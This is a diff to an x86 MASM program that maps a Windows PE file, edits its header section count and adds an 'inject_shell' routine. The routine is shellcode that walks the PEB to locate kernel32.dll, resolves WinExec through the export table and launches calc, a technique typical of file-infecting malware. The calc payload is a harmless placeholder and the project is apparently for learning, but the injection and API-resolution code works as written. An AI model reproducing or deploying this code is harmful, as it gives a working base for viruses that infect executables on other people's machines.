@@ -69,7 +69,7 @@ start:
     Mov viewOfFile, Eax
 
     Mov Edi, Ebx
-    Add Edi, DWord Ptr [Edi + 3CH]
+    Add Edi, [Edi + 3CH]
     Mov NT_Header, Edi			; Save the offset of NT_Header from edi register
 
     Mov Ebx, Edi
@@ -92,7 +92,7 @@ start:
     Mov Ecx, [Esi]
     Mov sizeOfImage, Ecx
 
-    Mov Ecx, DWord Ptr [Ebx + 10H]      ; Get the AddressOfEntryPoint
+    Mov Ecx, [Ebx + 10H]      ; Get the AddressOfEntryPoint
     Mov AddressOfEntryPoint, Ecx
     Xor Eax, Eax
     Mov Eax, AddressOfEntryPoint
@@ -172,13 +172,96 @@ start:
     Invoke SetFilePointer, fileHandle, Esi, NULL, FILE_BEGIN ; Set file pointer to the location of NumberOfSections
     Invoke WriteFile, fileHandle, Offset NumberOfSections, SizeOf Word, Addr BytesWritten, NULL ; Write the updated value
 
+inject_shell:
+	Assume Fs:Nothing
+	Xor Eax, Eax
+	Mov [Ebp - 4H], Eax			; This will store the number of exported function in kernel32.dll
+	Mov [Ebp - 8H], Eax			; This will store the address of exported table
+	Mov [Ebp - 0CH], Eax		; This will store the address of exported name table
+	Mov [Ebp - 10H], Eax		; This will store the address of ordinal table
+	Mov [Ebp - 14H], Eax
 
+	Push 00636578H
+	Push 456E6957H
+	Mov [Ebp - 14H], Esp		; Push WinExec
+
+	Mov Eax, [Fs:30H]			; PEB
+    Mov Eax, [Eax + 0CH]		; PEB_LDR_DATA
+    Mov Eax, [Eax + 14H]		; InMemoryOrderModuleList
+    Mov Eax, [Eax]				; Get pointer to the second (ntdll.dll) entry in InMemoryOrderModuleList
+    Mov Eax, [Eax]				; Get pointer to the third (kernel32.dll) list in InMemoryOrderModuleList
+    Mov Eax, [Eax + 10H]
+	Mov Ebx, Eax				; Store kernel32.dll base address in ebx
+
+	Mov Eax, [Ebx + 3CH]
+	Add Eax, Ebx				; PE signature
+
+	Mov Eax, [Eax + 78H]
+	Add Eax, Ebx				; Address of Export Table
+
+	; Get number of exported functions
+	Mov Ecx, [Eax + 14H]
+	Add Ecx, Ebx
+	Mov [Ebp - 4H], Ecx
+
+	; Get address of functions
+	Mov Ecx, [Eax + 1CH]
+	Add Ecx, Ebx
+	Mov [Ebp - 8H], Ecx
+
+	; Get address of name table
+	Mov Ecx, [Eax + 20H]
+	Add Ecx, Ebx
+	Mov [Ebp - 0CH], Ecx
+
+	; Get address of ordinal table
+	Mov Ecx, [Eax + 24H]
+	Add Ecx, Ebx
+	Mov [Ebp - 10H], Ecx
+
+	Xor Eax, Eax			; Counter for loop
+	Xor Ecx, Ecx
+
+getFunctionPosition:
+	Mov Esi, [Ebp - 14H]	; Name of Function
+	Mov Edi, [Ebp - 0CH]	; Pointer points to the start of name table
+	Mov Edi, [Edi + Eax * 4]; RVA of next function name
+	Add Edi, Ebx
+
+	Mov Cx, 8
+	Repe Cmpsb				; Compare edi, esi
+	Jz getFunctionAddress	; If found the name then jump to getFunctionAddress
+	Inc Eax
+	Cmp Eax, [Ebp - 4H]		; Check for if counter < number of functions
+	Jne getFunctionPosition ; Loop
+
+; Calculate the ordinal of the function: (Address of ordinal table + position * sizeof(Ordinal))
+; After got the ordinal then calculate the RVA of the function address: (RVA AddressOfFunction + ordinal * sizeof(FunctionRVA))
+getFunctionAddress:
+	Xor Ecx, Ecx
+	Mov Ecx, [Ebp - 10H]		; Address of ordinal table
+	Mov Edx, [Ebp - 8H]			; Address of function
+
+	Mov Ax, [Ecx + Eax * 2]		; Get the function ordinal
+	Mov Eax, [Edx + Eax * 4]
+	Add Eax, Ebx				; Function address
+	Jmp invokeFunction
+
+invokeFunction:
+	Xor Edx, Edx
+	Push Edx
+	Push 636C6163H				; Push "calc" into the stack
+	Mov Ecx, Esp
+	Push 10						; uCmdShow = SW_SHOWDEFAULT
+	Push Ecx					; lpCmdLine = calc
+	Call Eax					; Call WinExec
     ; Cleanup and exit
     Invoke UnmapViewOfFile, Ebx
     Invoke CloseHandle, fileHandle
     Invoke CloseHandle, Edx
     Jmp exit_program
 
+; New section code injection will be implemented later
 error_exit:
     Push Offset errorMsg
     Call printf
